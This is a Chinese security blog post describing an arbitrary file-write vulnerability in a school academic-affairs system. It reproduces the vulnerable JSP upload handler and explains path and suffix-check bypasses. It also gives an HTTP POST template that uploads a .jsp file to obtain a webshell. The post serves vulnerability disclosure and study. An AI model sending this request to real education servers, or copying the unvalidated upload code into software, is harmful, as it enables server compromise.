#  重生之网安小FW，某教务一体化系统任意文件写入漏洞  
原创 chobits02  C4安全团队   2025-06-12 09:25  
  
## 前言  
  
之前在挖掘某个项目目标漏洞的时候，收集到了下面学校的系统。看系统是教育SRC经常出漏洞的常客，但是网上基本没有公开的漏洞信息，藏得真好啊  
  
系统页面如下，是某智的教务系统  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT3zGiag0vYXxvxjZ43SlPjuarvUU4jweLRPVDpC5cu4cCNS2YU7wXW3AicxKibH0PVibs8nZoPVicLbsQ/640?wx_fmt=png&from=appmsg "")  
  
找了半天，好家伙只能在ddpoc上面找到，用微信注册一个账号，用仅存的20积分换个poc看下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT3zGiag0vYXxvxjZ43SlPjuxqlQQYkxoPJ1DvvZIic62ibaIhdeh5QHicXsfMRlUdZDWhxQzpPVP6ibXw/640?wx_fmt=png&from=appmsg "")  
  
给的poc也不是标准的nuclei格式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT3zGiag0vYXxvxjZ43SlPjus9gFs0ffAtA8Cx51Y8GibdnOaZ6DLabJiauVxoZIMZ7EJQzQfrQsUtOA/640?wx_fmt=png&from=appmsg "")  
  
看个大概吧，使用;/绕过特殊处理URL，然后%70应该是请求绕过后缀检测  
  
可惜在系统上面试了试，都是利用不了的，但是手边正好有份源码，我简单分析下jsp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT3zGiag0vYXxvxjZ43SlPjuhZqH9jGkEMAX7xGicibYAbT6c7WYKAZicNiam7vL8TL3fT5CITwDSpnYxA/640?wx_fmt=png&from=appmsg "")  
  
文件路径就是  
\ROOT\framework\scan\jsp  
  
代码如下  
```
<%@ page contentType="text/html; charset=utf-8" language="java" import="java.sql.*,java.io.*" errorPage="" %>
<%
String savePath=config.getServletContext().getRealPath("/images/");
        File tmp_path=new File(savePath);
        tmp_path.mkdirs();
        System.out.println("照片数据保存路径:"+savePath);
String pic_base_64_data=request.getParameter("picData");
//如果下面的代码输出true则说明需要调整服务器软件工作参数，解决接受post数据的大小限制问题,例如
//tomcat的话需要在server.xml中配置maxPostSize="0"来解除上传数据的大小限制   <Connector port="8080" protocol="HTTP/1.1" 
//               connectionTimeout="20000" 
//               redirectPort="8443" maxPostSize="0"/>
// 
System.out.println(null==pic_base_64_data);
System.out.println("base64 string length:"+pic_base_64_data.length());
String fileFormat=request.getParameter("picExt");
sun.misc.BASE64Decoder decode=new sun.misc.BASE64Decoder();
byte[] datas=decode.decodeBuffer(pic_base_64_data);
String filename=String.valueOf(System.currentTimeMillis())+fileFormat;
File file=new File(savePath+"/"+filename);
System.out.println("file="+file);
OutputStream fos=new FileOutputStream(file);
System.out.println("图片文件名称:"+filename);
fos.write(datas);
fos.close();
out.print("<a href='" + filename + "'>click here</a>");
out.flush();
out.close();
%>
```  
  
jsp文件接收  
Base64编码的图片数据，通过参数  
picData指定base64编码的内容，  
picExt指定文件后缀名  
  
保存的文件路径为  
/images/，如果上传成功，就拿返回数据包里面通过时间戳命名的filename+.jsp后缀来请求，就能getshell了  
  
因此上传文件请求体大致如下  
```
POST /;/framework/scan/jsp/submit.js%70 HTTP/1.1
Host: 

Content-Type: application/x-www-form-urlencoded
picData=base64编码内容&picExt=.jsp
```  
  
师傅们看个乐呵，现在这漏洞都修的差不多了，恰个柠檬  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT3zGiag0vYXxvxjZ43SlPjuGo2icdMpUtKQBf9qlGDia5hwXJWhe9Z3JR7CBibt0ymIYSibNFxzEhhribg/640?wx_fmt=png&from=appmsg "")  
  
  
最后总结  
  
感兴趣的可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，加入团队等都可联系下方微信，扫码即可。**  
  
END  
  
  
  
  
  
  
  
  
  
